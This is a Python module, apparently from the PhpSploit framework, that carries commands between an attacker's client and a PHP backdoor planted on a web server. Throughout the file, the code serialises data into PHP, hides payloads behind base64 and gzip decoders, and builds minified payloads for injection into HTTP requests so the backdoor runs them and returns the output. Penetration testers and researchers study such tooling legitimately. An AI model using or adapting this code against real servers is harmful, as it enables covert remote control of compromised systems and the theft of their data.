"""Handle communication between python client and PHP backdoor"""
__all__ = ["py2php", "php2py", "Build", "Encode"]

import codecs
import base64

import phpserialize

import core
from core import session
from core import encoding
from datatypes import Path
from .exceptions import BuildError


def _phpserialize_recursive_dict2list(python_var):
    """Get real python list() objetcs from php objects.
    * As php makes no difference between lists and
    dictionnaries, we should call this function which
    recursively converts all dict() generated object that
    can be converted into list().
    """
    if isinstance(python_var, dict):
        if list(python_var.keys()) == list(range(len(python_var))):
            python_var = [python_var[x] for x in python_var]
    if isinstance(python_var, dict):
        for key, val in python_var.items():
            python_var[key] = _phpserialize_recursive_dict2list(val)
    if isinstance(python_var, list):
        #for x in range(len(python_var)):
        for x, _ in enumerate(python_var):
            python_var[x] = _phpserialize_recursive_dict2list(python_var[x])
    return python_var


def py2php(python_var):
    """Convert a python object into php serialized code string.
    """
    serialized = phpserialize.dumps(python_var,
                                    charset=encoding.default_encoding,
                                    errors=encoding.default_errors)
    serialized = encoding.decode(serialized)
    encoded = Encode(serialized).php_loader()
    raw_php_var = 'unserialize(%s)' % encoded
    return raw_php_var


def php2py(raw_php_var):
    """Convert a php code string into python object.
    """
    python_var = phpserialize.loads(raw_php_var,
                                    charset=encoding.default_encoding,
                                    errors=encoding.default_errors,
                                    object_hook=phpserialize.phpobject,
                                    decode_strings=True)
    python_var = _phpserialize_recursive_dict2list(python_var)
    return python_var


class Encode:
    """Take a php code string, and convert it into an encoded payload,
    to ease merging within an existing php payload.

    Payload is also minified with gzip compression (in 'auto' mode).

    USAGE
    =====
    Encodings:
    ----------
    * base64:
        Encode payload with base64, an wrap it with php `base64_decode()`
    * gzip + base64:
        Encode payload with zlib, and the encode it with base64.

    Modes:
    ------
    * default:
        base64 encode only.
    * auto:
        base64 encode, and only compress if it reduces payload size.
    * compress:
        base64 encode, and force usage of compression.

    ATTRIBUTES
    ==========
    * decoder (str)
        php decoding string for current payload
        >>> Encode(payload, "base64").decoder
        'base64_decode(%s)'

    * data (str):
        encoded payload, without it's decoder, in the form of a base64 string

    * rawlength (int):
        same as `len(data)`

    * length (int):
        amout of bytes payload will take after being copied to an http request

    * compressed (bool):
        True if encoder has been compressed
    """

    def __init__(self, code, mode='default'):
        """Generate encoded payload attributes
        """
        if isinstance(code, str):
            code = bytes(code, "utf-8")
        self.compressed = False
        self.data = b''
        self.decoder = 'base64_decode("%s")'
        if mode in ['compress', 'auto']:
            gz_payload = codecs.encode(code, "zlib")
            gz_payload = base64.b64encode(gz_payload)
            gz_decoder = 'gzuncompress(base64_decode("%s"))'
            if mode == 'compress':
                self.compressed = True
                self.data = gz_payload
                self.decoder = gz_decoder
        if mode != 'compress':
            self.data = base64.b64encode(code)
        if mode == 'auto':
            if len(gz_payload) < len(self.data):
                self.data = gz_payload
                self.decoder = gz_decoder
                self.compressed = True
        self.data = self.data.decode()
        self.rawlength = len(self.data)
        self.length = self._get_real_transport_length(self.data)

    @staticmethod
    def _get_real_transport_length(payload):
        """get real length payload takes once used in HTTP requests.

        Indeed, base64 strings contain 3 chars '/+=' that are urlencoded,
        and then take 3 bytes each in an HTTP request.
        """
        length = len(payload)
        length += payload.count('/') * 2
        length += payload.count('+') * 2
        length += payload.count('=') * 2
        return length

    def php_loader(self):
        """Returns payload string, wrapped with it's php decoder
        """
        return self.decoder % self.data


class Build:
    """Generate final payload, ready to be injected into http requests.

    The returned string includes `parser`, the separation tags allowing
    tunnel handler to retrieve output returned from payload after
    remote http request execution.

    The payload is also encapsulated through phpsploit standard
    encapsulator (./data/tunnel/encapsulator.php).
    """
    encapsulator = Path(core.BASEDIR, 'data/tunnel/encapsulator.php').phpcode()

    def __init__(self, php_payload, parser):

        self.loaded_phplibs = list()

        php_payload = self.encapsulate(php_payload, parser)
        php_payload = self._load_php_libs(php_payload)
        php_payload = self._php_minify(php_payload)

        encoded_payload = Encode(php_payload.encode(), 'noauto')

        self.data = encoded_payload.data
        self.length = encoded_payload.length
        self.decoder = encoded_payload.decoder

    def encapsulate(self, payload, parser):
        """Wrap `payload` with `parser` tags, so the payloads prints
        those tags into the page at remote php runtime, allowing tunnel
        handler to extract result from HTTP response body.
        """
        # template encapsulation
        code = self.encapsulator.replace('%%PAYLOAD%%', payload)
        payload_prefix = self._get_raw_payload_prefix()
        code = code.replace("%%PAYLOAD_PREFIX%%", payload_prefix)
        code = code.rstrip(';') + ';'
        # parser encapsulation
        if parser:
            header, footer = ['echo "%s";' % x for x in parser.split('%s')]
            code = header + code + footer
        return code

    @staticmethod
    def _get_raw_payload_prefix():
        """return $PAYLOAD_PREFIX setting, without php tags, in raw format
        """
        tmpfile = Path()
        tmpfile.write(session.Conf.PAYLOAD_PREFIX())
        payload_prefix = tmpfile.phpcode()
        del tmpfile
        return payload_prefix

    def _load_php_libs(self, code):
        """Replace `!import(<FOO>)` special syntax with real
        local library files.
        """
        result = ''
        for line in code.splitlines():
            comp_line = line.replace(' ', '')
            if not comp_line.startswith('!import('):
                result += line + '\n'
            else:
                libname = line[(line.find('(') + 1):line.find(')')]
                if line.count('(') != 1 or line.count(')') != 1 or not libname:
                    raise BuildError('Invalid php import: ' + line.strip())
                if libname not in self.loaded_phplibs:
                    try:
                        file_path = 'api/php-functions/%s.php' % libname
                        lib = Path(core.COREDIR, file_path).phpcode()
                    except ValueError:
                        raise BuildError('Php lib not found: ' + libname)
                    result += self._load_php_libs(lib) + '\n'
                    self.loaded_phplibs.append(libname)
        return result

    @staticmethod
    def _php_minify(code):
        """Basic PHP minifier, to optimize final payload size
        """
        lines = []
        for line in code.splitlines():
            line = line.strip()
            if line and not line.startswith("//"):
                lines.append(line)
        return '\n'.join(lines)
